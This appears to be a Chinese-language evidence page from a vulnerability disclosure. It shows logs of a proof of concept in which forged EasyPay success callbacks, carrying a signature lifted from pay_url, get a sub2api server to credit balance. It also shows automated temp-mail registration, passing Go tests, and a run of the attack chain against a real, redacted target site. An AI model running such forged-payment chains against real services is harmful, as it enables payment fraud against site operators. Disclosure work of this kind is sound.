# 证据 · 真实验签日志

以下片段来自 `go-poc/cmd/pocserver`（使用**未修改**的真实 `easypay.go`）。

## 攻击成功（未修复的服务端）

```
[webhook] ACCEPTED order=sub2_TEST1001 status=success amount=10.00 credited=true balance=10.00
[webhook] ACCEPTED order=sub2_TEST1002 status=success amount=10.00 credited=true balance=20.00
[webhook] ACCEPTED order=sub2_TEST1003 status=success amount=10.00 credited=true balance=30.00
```

客户端侧：
```
[3] 解析支付 URL, 构造伪造回调
[+] 已从 pay_url 提取下单签名: <sign>
[4] 发送伪造支付成功回调 (POST /api/v1/payment/webhook/easypay)
[*] webhook 响应: HTTP 200 body='{"code":0,...,"message":"success"}'
[5] 轮询验证订单状态与余额
[+] 订单 sub2_TEST1001 状态=PAID, 余额增加 10.00
判定结果: VULNERABLE
```

## 注册端点日志（真实验证码流程）

```
[send-verify-code] 126890@tempmail.cn
[register] 126890@tempmail.cn password=*** verify_code=009930
```

## 注册成功后的探测

```
[0/5] 自动注册 126890@tempmail.cn
  [+] 邮箱验证通过, 注册成功
  [1/5] 账户: 126890@tempmail.cn  余额: 0.00
  [2/5] payment_type=alipay 下单成功: order_id=1943 payment_mode=qrcode
  [!] 该通道返回的 pay_url 不含 submit.php 签名参数
判定结果: NOT_EXPLOITABLE
```

> 最后这条来自**一次真实目标的验证**（域名已脱敏）：注册成功、攻击链跑完，
> 但该站用 `qrcode` 模式，签名不下发给客户端，**漏洞前提不成立**。

## Go 单测（对未修改的真实源码）

```
=== RUN   TestSmuggleCreateSignatureIntoForgedCallback
--- PASS
=== RUN   TestSmuggleNegativeControl
--- PASS
=== RUN   TestSmuggleRealNotifyStillWorks
--- PASS
=== RUN   TestSmuggleServerReorder
--- PASS
PASS
ok  github.com/Wei-Shaw/sub2api/internal/payment/provider
```
